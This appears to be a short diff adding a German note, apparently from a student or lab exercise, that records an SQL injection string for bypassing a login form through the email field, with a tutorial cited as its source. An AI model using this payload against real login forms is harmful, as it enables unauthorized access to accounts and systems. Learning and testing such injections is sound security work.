@@ -1,0 +1,5 @@
+FLORIAN:
+    Befehl, um Login zu umgehen:
+
+    xxx@xxx.xxx' OR 1 = 1 LIMIT 1 -- ' ] in Email Adresse eingeben, Passowrt egal was
+    Quelle: https://www.guru99.com/learn-sql-injection-with-practical-example.html
